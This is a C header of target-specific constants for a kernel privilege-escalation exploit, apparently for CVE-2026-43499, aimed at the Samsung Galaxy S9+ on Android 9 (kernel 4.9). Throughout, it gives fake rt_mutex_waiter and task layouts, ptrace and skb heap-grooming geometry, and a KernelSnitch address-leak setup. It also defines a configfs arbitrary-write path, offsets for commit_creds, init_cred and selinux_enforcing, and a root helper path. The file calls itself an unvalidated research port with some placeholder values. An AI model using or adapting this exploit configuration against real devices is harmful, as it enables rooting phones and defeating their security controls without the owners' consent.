#ifndef OFFSET_H
#define OFFSET_H

/*
 * star2qlteue / SM-G965U1 (Galaxy S9+, Snapdragon 845)
 * Build G965U1UES6CSG4, Android 9, kernel 4.9.112-16002534.
 *
 * Status: RESEARCH PORT. Nothing in this profile has been validated on a
 * physical SM-G965U1. The 4.9 kernel is substantially different from the
 * 5.x/6.x kernels used by every hardware-proven profile in this tree:
 *
 *   - file_operations has .read/.write (no .read_iter/.write_iter);
 *   - configfs still ships configfs_write_bin_file (no bin_write_iter) and
 *     its d_fsdata lookup cannot be reused from an ashmem dentry;
 *   - futex_wait_requeue_pi places the real struct rt_mutex_waiter at
 *     entry_sp - 0x2e0 (x29 + 0x90).  The on-stack struct futex_q is at
 *     entry_sp - 0x228 (x29 + 0x148), not the waiter;
 *   - the pselect fd_set buffer cannot reach entry_sp - 0x2e0 on this
 *     kernel.  The 64-bit ashmem SET_NAME path lands at entry_sp - 0x298
 *     and only reaches waiter->deadline; the compat path lands lower but
 *     is a string copy and is unavailable to a 64-bit process;
 *   - task_struct / mm_struct / struct page / workqueue layouts are 4.9.
 *
 * The app profile uses PTRACE_SETREGSET/NT_PRFPREG as the stack writer.
 * In fpr_set(), x29 = entry_sp - 0x3f0 and the 0x210-byte FPSIMD buffer
 * starts at x29 + 0x60 = entry_sp - 0x390, so the stale waiter begins at
 * buffer offset 0xb0 and is covered completely.  This remains unverified
 * on a physical SM-G965U1.
 *
 * Values below were derived from the G965U1UES6CSG4 Image extracted from
 * the supplied boot.img and its recovered vmlinux.elf (156,023 symbols).
 * Text offsets were cross-checked by disassembly. Do not publish a binary
 * built from this profile as a supported target.
 */

#if defined(APP_PAYLOAD) && APP_PAYLOAD
#define BUILD_VARIANT_LABEL "star2qlteue-G965U1UES6CSG4-app-physical-p0-oracle"
#define APP_PHYS_P0_ORACLE 1
#else
#define BUILD_VARIANT_LABEL "star2qlteue-G965U1UES6CSG4-root-umh"
#endif
#ifndef BUILD_FINGERPRINT
#define BUILD_FINGERPRINT \
  "samsung/star2qlteue/star2qlteue:9/PPR1.180610.011/G965U1UES6CSG4:user/release-keys"
#endif

/* _text link address recovered from the image kallsyms table. */
#define KIMAGE_TEXT_BASE 0xffffff8008080000ULL
/*
 * 4.9 39-bit layout (from the image's address_markers table):
 * PAGE_OFFSET/linear map = 0xffffffc000000000, VMEMMAP_START =
 * 0xffffffbf00000000.  Do not use VA_START here; VA_START is the
 * modules region at 0xffffff8000000000.
 */
#define P0_PAGE_OFFSET 0xffffffc000000000ULL
#define P0_PHYS_OFFSET 0x80000000ULL
/*
 * Physical address of _text. The arm64 Image header declares
 * text_offset=0x80000 and the boot header loads the image at 0x80000000.
 * Verify from /proc/iomem or a boot log before trusting the P0 path.
 */
#define P0_KERNEL_PHYS_LOAD 0x80080000ULL

/*
 * __alloc_skb on this kernel reserves 0x180 bytes for skb_shared_info
 * (disassembly: "add w20, w20, #0x180"), so
 *   SKB_MAX_HEAD(0) = 0x1000 - 0x180 = 0xE80
 *   UNIX_SKB_FRAGS_SZ = 0x8000 (8 pages)
 * A single sendmsg of 0x8E80 bytes therefore produces one skb with 0xE80
 * linear bytes followed by exactly one order-3 fragment page.  The fragment
 * payload starts at SKB_MAX_HEAD, which is why SKB_DATA_DELTA must be
 * -0xE80.  Keep each send to one skb so each send allocates only one
 * order-3 page.
 */
#define SKB_SEND_SIZE 0x8e80
#define SKB_RECLAIM_SENDS 64
#define SKB_DATA_DELTA (-0xe80LL)

/*
 * proc_caches_init requests sizeof(struct mm_struct) = 0x348 with
 * SLAB_HWCACHE_ALIGN.  SLUB rounds the object up to the 64-byte cache
 * line: ALIGN(0x348, 64) = 0x380, so 0x380 is the real object stride.
 * With min_objects = 4 * (fls(nr_cpu_ids) + 1) = 20 on an 8-CPU device,
 * calculate_order() picks order 3: 32 KiB, 36 objects, 0x200 spare.
 *
 * KernelSnitch walks candidates by this stride, so it must be the SLUB
 * stride, not the requested object size.  With 0x348 a scan can only hit
 * object indices 15 and 30 and otherwise misses the leaked mm_struct.
 * Confirm with /sys/kernel/slab/mm_struct/object_size (0x348),
 * /sys/kernel/slab/mm_struct/objs_per_slab (36) and
 * /sys/kernel/slab/mm_struct/order (3).
 */
#define MM_STRUCT_SZ 0x380
#ifndef MM_ORDER
#define MM_ORDER 3
#endif

/* 4.9 has a single kmalloc_caches[] array indexed by kmalloc index. */
#define KMALLOC_CGROUP_TYPE 0
#define KMALLOC_CACHE_TYPES 1

/* struct rt_mutex_waiter (4.9): rb_node tree/pi_tree, task, lock, prio. */
#define LEGACY_RT_MUTEX_WAITER 1
#define COMPACT_RT_MUTEX_WAITER 0
#define FAKE_WAITER_PI_TREE_ENTRY_OFF 0x18
#define FAKE_WAITER_TASK_OFF 0x30
#define FAKE_WAITER_LOCK_OFF 0x38
#define FAKE_WAITER_PRIO_OFF 0x40
#define FAKE_WAITER_DEADLINE_OFF 0x48
#define FAKE_WAITER_LAYOUT_SIZE 0x50

/*
 * Use the real init_task/root_task_group instead of a fake task. The 4.9
 * fake-task offsets (sched_task_group, cgroup fields) are not verified.
 */
#define SLIDE_USE_FAKE_TASK 0
#define FAKE_TASK_USAGE_OFF 0x30
#define FAKE_TASK_PRIO_OFF 0x70
#define FAKE_TASK_NORMAL_PRIO_OFF 0x78
#define FAKE_TASK_PI_LOCK_OFF 0x904
#define FAKE_TASK_PI_WAITERS_OFF 0x908
#define FAKE_TASK_PI_TOP_TASK_OFF 0x918
#define FAKE_TASK_PI_BLOCKED_ON_OFF 0x920

#define SLIDE_FAKE_WAITER_PRIO 0
#define SLIDE_WAITER_WAKE_STATE 0
#define SLIDE_LOCK_OWNER_VALUE 1ULL

/*
 * sched_blocked_reason is backported by Samsung. Its 4.9 record layout is
 * pid at +8, caller at +0x10, io_wait at +0x18 (verified by disassembling
 * trace_event_raw_event_sched_blocked_reason). Event index 54 -> id 71.
 */
#define SLIDE_TRACEFS_EVENT_ID 71
#define SLIDE_TRACEFS_WORKER_CALLER_OFF 0x0004ca4cULL

/*
 * The pselect writer geometry does not reach the 4.9 futex waiter. The
 * value is kept for build parity; the app profile selects the ptrace
 * regset writer below instead.
 */
#define SLIDE_PSELECT_WORD_SHIFT 0

/* Stack distances from the per-syscall entry sp. */
#define SLIDE_WAITER_STACK_OFF 0x2e0
#define SLIDE_FUTEX_Q_STACK_OFF 0x228

/*
 * PTRACE_SETREGSET / NT_PRFPREG writer:
 *   fpr_set() frame = 0x280, x29 = entry_sp - 0x3f0;
 *   FPSIMD buffer at x29 + 0x60 = entry_sp - 0x390, size 0x210;
 *   stale waiter at entry_sp - 0x2e0 = buffer + 0xb0.
 */
#define SLIDE_STACK_WRITER_PTRACE 3
#define PTRACE_FPR_WAITER_OFF 0xb0
#define PTRACE_FPR_BUFFER_SIZE 0x210

#define SLIDE_P0_OFFSET_CANDIDATES \
  0x000000ULL, 0x010000ULL, 0x020000ULL, 0x030000ULL, \
  0x040000ULL, 0x050000ULL, 0x060000ULL, 0x070000ULL, \
  0x080000ULL, 0x090000ULL, 0x0a0000ULL, 0x0b0000ULL, \
  0x0c0000ULL, 0x0d0000ULL, 0x0e0000ULL, 0x0f0000ULL, \
  0x100000ULL, 0x110000ULL, 0x120000ULL, 0x130000ULL, \
  0x140000ULL, 0x150000ULL, 0x160000ULL, 0x170000ULL, \
  0x180000ULL, 0x190000ULL, 0x1a0000ULL, 0x1b0000ULL, \
  0x1c0000ULL, 0x1d0000ULL, 0x1e0000ULL, 0x1f0000ULL
#define SLIDE_MAX_ATTEMPTS 32

#if defined(APP_PAYLOAD) && APP_PAYLOAD
#define ROUTE_WAIT_SECONDS 8
#define PSELECT_ENTER_DELAY_USEC 50000
#define SLIDE_PSELECT_TIMEOUT_NSEC 100000000L
#define SLIDE_KSNITCH_APPENDED_FUTEXES 2048
#define SLIDE_KSNITCH_REPEAT_MEASUREMENT 64
#define SLIDE_KSNITCH_AVERAGE 8
#define SLIDE_BANK_SLOTS 4
#define SLIDE_BANK_TASK_OFF 0x1000
#define SLIDE_BANK_TASK_STRIDE 0x1c0
#define SLIDE_BANK_LOCK_OFF 0x5200
#define SLIDE_BANK_SLOT_STRIDE 0x100
#define SLIDE_BANK_WAITER_OFF 0x40
#define P0_ORACLE_GATE_SLOT 0
#define P0_ORACLE_PROBE_SLOT 1
#define P0_ORACLE_GATE_RESTORE_SLOT 2
#define P0_ORACLE_PROBE_RESTORE_SLOT 3
#define P0_ORACLE_GATE_PAGE_OFF 0x0e80
#define P0_ORACLE_GATE_OBJECT_INDEX 1
#define P0_ORACLE_PROBE_OFFSET 0x1f0000ULL
#define P0_FINGERPRINT_HEADER \
  "targets/star2qlteue-G965U1UES6CSG4/p0_fingerprint.h"
#endif

#define KERNELSNITCH_IDENTITY_START 0xffffffc000000000ULL
#define KERNELSNITCH_IDENTITY_END 0xffffffd000000000ULL
/*
 * kernel/futex.c on this build:
 *   futex_hashsize = roundup_pow_of_two(256 * num_possible_cpus())
 * CONFIG_NR_CPUS=8 and the DT exposes 8 possible CPUs, so the table has
 * 2048 buckets.  Pin it instead of relying on sysconf() in the app domain.
 */
#define KERNELSNITCH_FUTEX_HASH_SIZE 2048
#define DIRECT_MAP_BASE 0xffffffc000000000ULL
#define DIRECT_MAP_END 0xffffffd000000000ULL
/*
 * 4.9 39-bit virtual layout, confirmed by the image's address_markers
 * table and kfree's virt_to_head_page():
 *
 *   PAGE_OFFSET  = 0xffffffc000000000  (linear map)
 *   VMEMMAP_SIZE = 4 GiB                (VA_BITS=39, 64-byte struct page)
 *   VMEMMAP_START = PAGE_OFFSET - VMEMMAP_SIZE
 *
 * kfree computes:
 *   page = VMEMMAP_START | (((addr >> 12) & 0x3ffffff) << 6)
 * which is what direct_to_page() implements with the constants below.
 */
#define VMEMMAP_START 0xffffffbf00000000ULL

#define MM_DMA32_ALIAS_START 0xffffffc000000000ULL
#define MM_DMA32_ALIAS_END 0xffffffc080000000ULL
#define MM_NORMAL_ALIAS_START MM_DMA32_ALIAS_END
#define MM_NORMAL_ALIAS_END KERNELSNITCH_IDENTITY_END

#define APPENDED_FUTEXES 4096
#define REPEAT_MEASUREMENT 128
#define AVERAGE 8
#define KERNELSNITCH_BASELINE_SAMPLES 8
#define KERNELSNITCH_BASELINE_QUANTILE 1
#define KERNELSNITCH_THRESHOLD_MULT 10
#define S918_PAGE_SCAN_MAX 256
#define S918_KSNITCH_HINT_COLLISIONS 2
#define S918_KSNITCH_FULL_COLLISIONS 5
#define S918_DMA32_SKIP_SLABS 8
#define S918_TRIGGER_SLABS 24
#define S918_SKB_SENDS 256
#define S918_SKB_SNDBUF 8388608
#define S918_RECLAIM_SOCKET_PAIRS 32

/* commit_creds disassembly: real_cred at 0x838, cred at 0x840. */
#define TASK_STRUCT_CRED_OFF      0x840ULL
#define TASK_STRUCT_REAL_CRED_OFF 0x838ULL
#define FAKE_TASK_TASK_GROUP_OFF  0x2c0ULL

/* Text symbol offsets relative to KIMAGE_TEXT_BASE (verified by disasm). */
#define INIT_TASK_OFF             0x029a7800ULL
#define INIT_CRED_OFF             0x015e0008ULL
#define PREPARE_KERNEL_CRED_OFF   0x00057728ULL
#define COMMIT_CREDS_OFF          0x00056ff4ULL
/*
 * This kernel has no standard override_creds(). Samsung ships
 * rkp_override_creds() at 0x000568b8 instead, and its ABI/checks are not
 * interchangeable with override_creds(). No current code path uses this
 * symbol, so it is deliberately not defined as OVERRIDE_CREDS_OFF.
 */
#define RKP_OVERRIDE_CREDS_OFF    0x000568b8ULL
#define ROOT_TASK_GROUP_OFF       0x02c62580ULL
#define SELINUX_ENFORCING_OFF     0x015e00f0ULL
#define KMALLOC_CACHES_OFF        0x02cf1778ULL
#define ANON_PIPE_BUF_OPS_OFF     0x0169fe80ULL
#define SYSTEM_UNBOUND_WQ_OFF     0x02994780ULL
#define CALL_USERMODEHELPER_EXEC_WORK_OFF 0x00048c5cULL

#define ASHMEM_FOPS_OFF           0x018157e0ULL
#define ASHMEM_MISC_FOPS_OFF      0x02b7c3f8ULL
#define ASHMEM_IOCTL_OFF          0x00dbc9e4ULL
#define ASHMEM_COMPAT_IOCTL_OFF   0x00dbd004ULL
#define ASHMEM_MMAP_OFF           0x00dbc3c8ULL
#define ASHMEM_OPEN_OFF           0x00dbc338ULL
#define ASHMEM_RELEASE_OFF        0x00dbd064ULL
#define ASHMEM_LLSEEK_OFF         0x00dbc7d4ULL
/*
 * 4.9 configfs exposes classic .read/.write file operations. There is no
 * configfs_read_iter/configfs_bin_write_iter pair:
 *   configfs_read_file  uses buffer->page + buffer->count;
 *   configfs_write_file copies to buffer->page and only then dereferences
 *   file->f_path.dentry for attr->store.  A faulting copy returns before
 *   that dereference, which is the legacy arbitrary-write path.
 */
#define CONFIGFS_READ_FILE_OFF    0x002659f8ULL
#define CONFIGFS_WRITE_FILE_OFF   0x00265fa8ULL
#define CONFIGFS_WRITE_BIN_FILE_OFF 0x00265c38ULL
#define COPY_SPLICE_READ_OFF      0x0020ab6cULL
#define NOOP_LLSEEK_OFF           0x001d0e30ULL

#define ASHMEM_MISC_FOPS (KIMAGE_TEXT_BASE + ASHMEM_MISC_FOPS_OFF)
#define ASHMEM_FOPS (KIMAGE_TEXT_BASE + ASHMEM_FOPS_OFF)
#define ASHMEM_IOCTL (KIMAGE_TEXT_BASE + ASHMEM_IOCTL_OFF)
#define ASHMEM_COMPAT_IOCTL (KIMAGE_TEXT_BASE + ASHMEM_COMPAT_IOCTL_OFF)
#define ASHMEM_MMAP (KIMAGE_TEXT_BASE + ASHMEM_MMAP_OFF)
#define ASHMEM_OPEN (KIMAGE_TEXT_BASE + ASHMEM_OPEN_OFF)
#define ASHMEM_RELEASE (KIMAGE_TEXT_BASE + ASHMEM_RELEASE_OFF)
#define ASHMEM_LLSEEK (KIMAGE_TEXT_BASE + ASHMEM_LLSEEK_OFF)
#define CONFIGFS_READ_FILE (KIMAGE_TEXT_BASE + CONFIGFS_READ_FILE_OFF)
#define CONFIGFS_WRITE_FILE (KIMAGE_TEXT_BASE + CONFIGFS_WRITE_FILE_OFF)
#define CONFIGFS_WRITE_BIN_FILE (KIMAGE_TEXT_BASE + CONFIGFS_WRITE_BIN_FILE_OFF)
/* Names used by the shared 5.x code paths; both resolve to the 4.9 entries. */
#define CONFIGFS_READ_ITER CONFIGFS_READ_FILE
#define CONFIGFS_BIN_WRITE_ITER CONFIGFS_WRITE_FILE
#define COPY_SPLICE_READ (KIMAGE_TEXT_BASE + COPY_SPLICE_READ_OFF)
#define NOOP_LLSEEK (KIMAGE_TEXT_BASE + NOOP_LLSEEK_OFF)
#define INIT_TASK (KIMAGE_TEXT_BASE + INIT_TASK_OFF)
#define INIT_CRED (KIMAGE_TEXT_BASE + INIT_CRED_OFF)
#define ROOT_TASK_GROUP (KIMAGE_TEXT_BASE + ROOT_TASK_GROUP_OFF)
#define SELINUX_ENFORCING (KIMAGE_TEXT_BASE + SELINUX_ENFORCING_OFF)
#define KMALLOC_CACHES (KIMAGE_TEXT_BASE + KMALLOC_CACHES_OFF)
#define ANON_PIPE_BUF_OPS (KIMAGE_TEXT_BASE + ANON_PIPE_BUF_OPS_OFF)
#define SYSTEM_UNBOUND_WQ (KIMAGE_TEXT_BASE + SYSTEM_UNBOUND_WQ_OFF)
#define CALL_USERMODEHELPER_EXEC_WORK (KIMAGE_TEXT_BASE + CALL_USERMODEHELPER_EXEC_WORK_OFF)

#define ROOT_UMH_PATH "/data/local/tmp/cve-2026-43499-root"
#define ROOT_UMH_WORK_OFF 0x6000
#define ROOT_UMH_DATA_OFF 0x6200

/* 4.9 nfulnl_logger + random_table boot_id entry (RELA addends). */
#define SLIDE_NFULNL_LOGGER_NAME_OFF 0x021d82e0ULL
#define SLIDE_NFULNL_LOGGER_OBJECT_OFF 0x0299d480ULL
#define SLIDE_RANDOM_TABLE_BOOT_ID_ENTRY_OFF 0x02a403e8ULL
#define SLIDE_RANDOM_TABLE_BOOT_ID_DATA_PTR_OFF 0x02a403f0ULL
#define SLIDE_INIT_TASK_OFF INIT_TASK_OFF
#define SLIDE_ROOT_TASK_GROUP_OFF ROOT_TASK_GROUP_OFF
#define SLIDE_SYSCTL_BOOTID_OFF 0x02e58a88ULL

#define SLIDE_NFULNL_LOGGER_NAME_IMAGE \
  (KIMAGE_TEXT_BASE + SLIDE_NFULNL_LOGGER_NAME_OFF)
#define SLIDE_NFULNL_LOGGER_OBJECT_IMAGE \
  (KIMAGE_TEXT_BASE + SLIDE_NFULNL_LOGGER_OBJECT_OFF)
#define SLIDE_RANDOM_TABLE_BOOT_ID_ENTRY_IMAGE \
  (KIMAGE_TEXT_BASE + SLIDE_RANDOM_TABLE_BOOT_ID_ENTRY_OFF)
#define SLIDE_RANDOM_TABLE_BOOT_ID_DATA_PTR_IMAGE \
  (KIMAGE_TEXT_BASE + SLIDE_RANDOM_TABLE_BOOT_ID_DATA_PTR_OFF)
#define SLIDE_INIT_TASK_IMAGE (KIMAGE_TEXT_BASE + SLIDE_INIT_TASK_OFF)
#define SLIDE_ROOT_TASK_GROUP_IMAGE \
  (KIMAGE_TEXT_BASE + SLIDE_ROOT_TASK_GROUP_OFF)
#define SLIDE_SYSCTL_BOOTID_IMAGE \
  (KIMAGE_TEXT_BASE + SLIDE_SYSCTL_BOOTID_OFF)

/* Payload layout inside the reclaimed order-MM_ORDER page. */
#define LOCK_OFF 0x2210
#define W0_OFF 0x2350
#define FOPS_OFF 0x2000
#define SCRATCH_OFF 0x3000
#define RIGHT_OFF 0x4440
#define LEFT_OFF 0x5550
#define FAKE_TASK_OFF 0x3200

/*
 * configfs_buffer on this 4.9 Samsung build (disassembly of
 * configfs_read_file/configfs_write_file):
 *   count 0x00, pos 0x08, page 0x10, ops 0x18, mutex 0x20,
 *   needs_read_fill 0x48, read_in_progress 0x4c, write_in_progress 0x4d,
 *   bin_buffer 0x50, bin_buffer_size 0x58.
 * The legacy write path only needs page/needs_read_fill. bin_buffer and
 * cb_max_size belong to the unusable bin path and are not set.
 */
#define CFG_PAGE_OFF 0x10
#define CFG_NEEDS_READ_FILL_OFF 0x48
#define CFG_BIN_BUFFER_OFF 0x50
#define CFG_BIN_BUFFER_SIZE_OFF 0x58

/*
 * struct miscdevice (4.9): fops 0x10, list 0x18, parent 0x28,
 * this_device 0x30, groups 0x38, nodename 0x40, mode 0x48, size 0x50.
 * The legacy fops restore rewrites 0x10..0x49 and lets the unavoidable
 * two zero bytes fall in the 0x4a..0x4f tail padding before
 * ashmem_shrinker.
 */
#define ASHMEM_MISC_RESTORE_OFF 0x10
#define ASHMEM_MISC_RESTORE_LEN 0x3a

/*
 * 4.9 workqueue layout is NOT the 5.x/6.x layout used by root.c. These
 * values are placeholders so the profile builds; the UMH root installer
 * must be re-derived for 4.9 before it can work.
 */
#define WQ_DFL_PWQ_OFF 0xb0
#define PWQ_POOL_OFF 0x00
#define PWQ_WQ_OFF 0x08
#define PWQ_WORK_COLOR_OFF 0x10
#define PWQ_REFCNT_OFF 0x18
#define PWQ_NR_IN_FLIGHT_OFF 0x1c
#define PWQ_NR_ACTIVE_OFF 0x5c
#define PWQ_MAX_ACTIVE_OFF 0x60
#define POOL_WORKLIST_OFF 0x20
#define POOL_NR_IDLE_OFF 0x34

#define WORK_DATA_OFF 0x00
#define WORK_ENTRY_OFF 0x08
#define WORK_FUNC_OFF 0x18

/* struct page 4.9: compound_head 0x20, slab_cache 0x30, memcg 0x38.
 * There is no page_type field; 0x38 is mem_cgroup. Keep the offset for the
 * diagnostic dump but do not treat it as a page type. */
#define STRUCT_PAGE_SIZE 0x40
#define STRUCT_PAGE_COMPOUND_HEAD_OFF 0x20
#define STRUCT_SLAB_CACHE_OFF 0x30
#define STRUCT_PAGE_TYPE_OFF 0x38
#define STRUCT_PAGE_TYPE_IS_MEMCG 1

#define PIPE_BUFFER_SLOTS 32
#define PIPE_BUF_FLAG_CAN_MERGE 0x10

/*
 * 4.9 struct file_operations (without CONFIG_COMPAT changes):
 * read 0x10, write 0x18, unlocked_ioctl 0x48, compat_ioctl 0x50,
 * mmap 0x58, open 0x60, release 0x70, splice_read 0xb8.
 * There is no ashmem .show_fdinfo on this driver.
 */
#define LEGACY_FOPS 1
#define FOPS_OWNER_OFF 0x00
#define FOPS_LLSEEK_OFF 0x08
#define FOPS_READ_OFF 0x10
#define FOPS_WRITE_OFF 0x18
#define FOPS_IOCTL_OFF 0x48
#define FOPS_COMPAT_IOCTL_OFF 0x50
#define FOPS_MMAP_OFF 0x58
#define FOPS_OPEN_OFF 0x60
#define FOPS_RELEASE_OFF 0x70
#define FOPS_SPLICE_READ_OFF 0xb8

#endif
